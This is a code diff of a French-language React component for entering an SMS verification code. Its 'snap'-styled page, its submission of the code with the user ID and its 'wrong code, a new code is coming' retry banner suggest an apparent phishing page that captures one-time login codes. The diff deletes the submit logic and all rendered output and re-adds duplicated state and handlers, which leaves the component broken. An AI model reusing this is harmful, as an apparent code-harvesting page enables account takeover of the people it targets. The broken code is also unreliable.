@@ -92,61 +92,39 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
         refs.current[Math.min(t.length, OTP_LEN - 1)]?.focus();
     };
 
-    const full = digits.join("");
-    const ready = full.length === OTP_LEN && !sending;
+   const ooo_MIN = 4;
+const ooo_MAX = 6;
 
-    const submit = async () => {
-        setSending(true);
-        try {
-            await submitCode(userId, full);
-            toast.success("Code envoyé, on vérifie...");
-            onSubmitted();
-        } catch {
-            toast.error("Erreur, réessaie.");
-        } finally {
-            setSending(false);
-        }
-    };
+const [digits, setDigits] = useState(Array(ooo_MAX).fill(""));
+const refs = useRef([]);
 
-    return (
-        <>
-            <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "6px 0 6px" }}>
-                <span className="snap-accent">Vérification</span> du code
-            </h2>
-            <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 24px", lineHeight: 1.5 }}>
-                Entre le code à 4 chiffres reçu par SMS.
-            </p>
-            {errorMsg && (
-                <div style={{ margin: "0 0 16px", padding: "10px 14px", background: "rgba(239,68,68,0.1)", border: "1px solid rgba(239,68,68,0.35)", borderRadius: 12, color: "#ef4444", fontSize: 13, textAlign: "center" }} data-testid="wrong-code-banner">
-                    ❌ Code incorrect. Un nouveau code arrive, réessaie.
-                </div>
-            )}
-            <div style={{ display: "flex", justifyContent: "center", gap: 8, marginBottom: 22 }} onPaste={handlePaste}>
-                {digits.map((d, i) => (
-                    <input
-                        key={i}
-                        ref={(el) => (refs.current[i] = el)}
-                        className="otp-input"
-                        inputMode="numeric"
-                        maxLength={1}
-                        value={d}
-                        onChange={(e) => setD(i, e.target.value)}
-                        onKeyDown={(e) => handleKey(i, e)}
-                        data-testid={`otp-input-${i}`}
-                    />
-                ))}
-            </div>
-            <button
-                className="snap-btn"
-                disabled={!ready}
-                onClick={submit}
-                data-testid="otp-submit-btn"
-            >
-                {sending ? "Envoi..." : "Valider le code"}
-            </button>
-        </>
-    );
-}
+const setD = (i, v) => {
+    const c = v.replace(/\D/g, "").slice(-1); // un seul chiffre
+    setDigits((prev) => {
+        const n = [...prev];
+        n[i] = c;
+        return n;
+    });
+    if (c && i < ooo_MAX - 1) refs.current[i + 1]?.focus();
+};
+
+const handleKey = (i, e) => {
+    if (e.key === "Backspace" && !digits[i] && i > 0) refs.current[i - 1]?.focus();
+    if (e.key === "ArrowLeft" && i > 0) refs.current[i - 1]?.focus();
+    if (e.key === "ArrowRight" && i < ooo_MAX - 1) refs.current[i + 1]?.focus();
+};
+
+const handlePaste = (e) => {
+    e.preventDefault();
+    const text = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, ooo_MAX);
+    if (!text) return;
+    setDigits(Array.from({ length: ooo_MAX }, (_, i) => text[i] ?? ""));
+    refs.current[Math.min(text.length, ooo_MAX - 1)]?.focus();
+};
+
+const full = digits.join("");
+const contiguous = digits.slice(0, full.length).every(Boolean); // pas de trou entre les cases
+const ready = full.length >= ooo_MIN && contiguous && !sending;
 
 function ProcessingCard() {
     return (
